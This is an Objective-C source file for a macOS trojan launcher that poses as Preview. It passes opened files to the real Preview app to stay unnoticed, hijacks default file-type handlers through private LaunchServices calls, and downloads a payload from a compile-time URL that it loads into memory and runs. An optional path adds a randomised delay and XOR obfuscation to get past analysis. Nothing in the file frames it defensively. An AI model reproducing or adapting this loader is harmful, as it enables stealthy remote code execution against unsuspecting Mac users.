#import <stdio.h>
#import <stdlib.h>
#import <unistd.h>
#import <spawn.h>
#import <crt_externs.h>
#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import <CoreServices/CoreServices.h>
#import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>
#import <signal.h>
#import <dispatch/dispatch.h>
#import <dlfcn.h>

#import "custom_dlfcn.h"

#ifndef PAYLOAD_URL
#error "PAYLOAD_URL must be defined at compile time via -DPAYLOAD_URL=..."
#endif

#ifndef REAL_BUNDLE
#define REAL_BUNDLE "/System/Applications/Preview.app"
#endif

static void open_real_app(NSArray<NSString *> *files) {
    NSMutableArray *args = [NSMutableArray arrayWithObjects:
        @"/usr/bin/open", @"-F", @"-a", @REAL_BUNDLE, nil];
    for (NSString *f in files) [args addObject:f];

    NSUInteger count = args.count;
    char **cargs = (char **)calloc(count + 1, sizeof(char *));
    for (NSUInteger i = 0; i < count; i++)
        cargs[i] = (char *)[args[i] UTF8String];
    cargs[count] = NULL;

    posix_spawn(NULL, "/usr/bin/open", NULL, NULL, cargs, *_NSGetEnviron());
    free(cargs);
}

@interface FileForwarder : NSObject <NSApplicationDelegate>
@property (nonatomic, assign) BOOL launched;
@end

@implementation FileForwarder
- (instancetype)init {
    self = [super init];
    _launched = NO;
    return self;
}
- (void)application:(NSApplication *)sender openFiles:(NSArray<NSString *> *)filenames {
    open_real_app(filenames);
    [sender replyToOpenOrPrint:NSApplicationDelegateReplySuccess];
    if (!_launched) {
        _launched = YES;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            [NSApp stop:nil];
            [NSApp postEvent:[NSEvent otherEventWithType:NSEventTypeApplicationDefined
                                                location:NSZeroPoint
                                           modifierFlags:0
                                               timestamp:0
                                            windowNumber:0
                                                 context:nil
                                                 subtype:0
                                                   data1:0
                                                   data2:0]
                     atStart:YES];
        });
    }
}
- (void)applicationDidFinishLaunching:(NSNotification *)notification {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        if (!_launched) {
            _launched = YES;
            open_real_app(@[]);
            [NSApp stop:nil];
            [NSApp postEvent:[NSEvent otherEventWithType:NSEventTypeApplicationDefined
                                                location:NSZeroPoint
                                           modifierFlags:0
                                               timestamp:0
                                            windowNumber:0
                                                 context:nil
                                                 subtype:0
                                                   data1:0
                                                   data2:0]
                     atStart:YES];
        }
    });
}
@end

static int ls_register_mode(int argc, const char *argv[]) {
    typedef OSStatus (*RegisterFn)(CFURLRef, uint32_t, void *, void *);
    typedef OSStatus (*UnregisterFn)(CFURLRef, void *, void *);

    void *ls = dlopen("/System/Library/Frameworks/CoreServices.framework/"
                      "Frameworks/LaunchServices.framework/LaunchServices",
                      RTLD_LAZY);
    if (!ls) return 1;

    RegisterFn reg = (RegisterFn)dlsym(ls, "_LSRegisterURLWithOptions");
    UnregisterFn unreg = (UnregisterFn)dlsym(ls, "_LSUnregisterURL");

    for (int i = 1; i < argc - 1; i += 2) {
        const char *flag = argv[i];
        const char *path = argv[i + 1];
        CFURLRef url = CFURLCreateWithFileSystemPath(NULL,
            CFStringCreateWithCString(NULL, path, kCFStringEncodingUTF8),
            kCFURLPOSIXPathStyle, true);
        if (!url) continue;

        if (strcmp(flag, "-f") == 0 && reg) {
            reg(url, 0x2, NULL, NULL);
        } else if (strcmp(flag, "-u") == 0 && unreg) {
            unreg(url, NULL, NULL);
        }
        CFRelease(url);
    }
    return 0;
}

static int set_handler_mode(const char *appPath) {
    @autoreleasepool {
        NSString *path = [[NSString stringWithUTF8String:appPath] stringByExpandingTildeInPath];
        NSURL *appURL = [NSURL fileURLWithPath:path];
        NSBundle *bundle = [NSBundle bundleWithURL:appURL];
        if (!bundle) return 1;

        NSDictionary *info = bundle.infoDictionary;
        NSString *bundleID = info[@"CFBundleIdentifier"];
        NSArray *docTypes = info[@"CFBundleDocumentTypes"];
        if (!docTypes || !bundleID) return 1;

        NSMutableSet<NSString *> *utiSet = [NSMutableSet set];
        for (NSDictionary *dt in docTypes) {
            NSArray *types = dt[@"LSItemContentTypes"];
            if (types) [utiSet addObjectsFromArray:types];
        }

        NSWorkspace *ws = [NSWorkspace sharedWorkspace];
        dispatch_group_t group = dispatch_group_create();

        for (NSString *utiStr in utiSet) {
            UTType *type = [UTType typeWithIdentifier:utiStr];
            if (!type) continue;

            NSURL *currentHandler = [ws URLForApplicationToOpenContentType:type];
            if (!currentHandler) continue;

            NSBundle *currentBundle = [NSBundle bundleWithURL:currentHandler];
            NSString *currentID = currentBundle.bundleIdentifier;
            if (!currentID || ![currentID isEqualToString:bundleID]) continue;

            dispatch_group_enter(group);
            [ws setDefaultApplicationAtURL:appURL
                       toOpenContentType:type
                       completionHandler:^(NSError *error) {
                dispatch_group_leave(group);
            }];
        }

        dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
        return 0;
    }
}

static void *ls_handle(void) {
    static void *ls;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        ls = dlopen("/System/Library/Frameworks/CoreServices.framework/"
                    "Frameworks/LaunchServices.framework/LaunchServices",
                    RTLD_LAZY);
    });
    return ls;
}

static void reregister_bundle(void) {
    typedef OSStatus (*RegisterFn)(CFURLRef, uint32_t, void *, void *);

    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
    if (!bundlePath) return;

    void *ls = ls_handle();
    if (!ls) return;

    RegisterFn reg = (RegisterFn)dlsym(ls, "_LSRegisterURLWithOptions");
    CFURLRef cloneURL = CFURLCreateWithFileSystemPath(NULL, (__bridge CFStringRef)bundlePath, kCFURLPOSIXPathStyle, true);

    if (reg && cloneURL) reg(cloneURL, 0x2, NULL, NULL);
    if (cloneURL) CFRelease(cloneURL);
}


static BOOL is_another_instance_running(void) {
    NSString *myPath = [[NSBundle mainBundle] bundlePath];
    if (!myPath) return NO;
    NSString *bundleId = [[NSBundle mainBundle] bundleIdentifier];
    if (!bundleId) return NO;
    NSArray *running = [NSRunningApplication runningApplicationsWithBundleIdentifier:bundleId];
    pid_t me = getpid();
    for (NSRunningApplication *app in running) {
        if (app.processIdentifier == me) continue;
        if ([app.bundleURL.path isEqualToString:myPath]) return YES;
    }
    return NO;
}

void signal_handler(int sig) {
    _exit(1);
}

#ifdef WARMUP_ENABLED
static uint32_t xorshift32(uint32_t *state) {
    uint32_t x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}
#endif

int main(int argc, const char * argv[]) {
    if (argc >= 3 && (strcmp(argv[1], "-f") == 0 || strcmp(argv[1], "-u") == 0))
        return ls_register_mode(argc, argv);
    if (argc == 3 && strcmp(argv[1], "-s") == 0)
        return set_handler_mode(argv[2]);

    NSApplication *app = [NSApplication sharedApplication];
    FileForwarder *forwarder = [[FileForwarder alloc] init];
    app.delegate = forwarder;
    [app run];

    reregister_bundle();

    if (is_another_instance_running()) _exit(0);

    signal(SIGSEGV, signal_handler);
    signal(SIGBUS, signal_handler);
    signal(SIGILL, signal_handler);
    signal(SIGABRT, signal_handler);

    NSURL* url = [NSURL URLWithString:@PAYLOAD_URL];
    NSData* payload = [NSData dataWithContentsOfURL:url];
    if (payload.length == 0) _exit(1);

#ifdef WARMUP_ENABLED
    uint32_t seed = (uint32_t)(getpid() ^ time(NULL));
    xorshift32(&seed);
    uint32_t delay = 300 + (xorshift32(&seed) % 601);
    sleep(delay);

    NSMutableData* buf = [payload mutableCopy];
    uint8_t* bytes = (uint8_t*)buf.mutableBytes;
    NSUInteger len = buf.length;

    uint8_t key = (uint8_t)(xorshift32(&seed) & 0xFF);
    if (key == 0) key = 0x42;
    for (NSUInteger i = 0; i < len; i++)
        bytes[i] ^= key;

    NSUInteger chunks = len < 1024 ? len : 1024;
    NSUInteger chunk_size = len / chunks;
    if (chunk_size == 0) chunk_size = 1;
    useconds_t chunk_delay = (useconds_t)(300.0 * 1000000.0 / chunks);

    for (NSUInteger off = 0; off < len; off += chunk_size) {
        NSUInteger end = off + chunk_size;
        if (end > len) end = len;
        for (NSUInteger i = off; i < end; i++)
            bytes[i] ^= key;
        usleep(chunk_delay);
    }

    void* handle = custom_dlopen_from_memory((void*)bytes, (int)len);
#else
    void* handle = custom_dlopen_from_memory((void*)payload.bytes, (int)payload.length);
#endif
    if (handle == NULL) _exit(1);

    [NSApp run];
}
